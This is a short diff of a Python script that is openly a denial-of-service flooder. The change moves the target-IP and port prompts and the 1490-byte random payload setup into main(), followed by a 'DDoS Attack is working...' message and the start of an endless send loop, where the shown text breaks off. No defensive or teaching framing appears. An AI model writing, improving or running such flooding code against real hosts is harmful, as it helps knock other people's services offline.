@@ -4,16 +4,16 @@
 import random
 from Socket import Socket
 
-IP_TARGET, port \
-    = input('IP Target: '), \
-      input('Initial port: ') or 90
-
-assert len(IP_TARGET) > 0
-
-target = Socket(IP_TARGET)
-BYTES = random._urandom(1490)
-
 def main():
+    IP_TARGET, port \
+        = input('IP Target: '), \
+        int(input('Initial port: ')) or 90
+
+    assert len(IP_TARGET) > 0
+
+    target = Socket(IP_TARGET)
+    BYTES = random._urandom(1490)
+
     print('DDoS Attack is working...')
     while True:
         try:
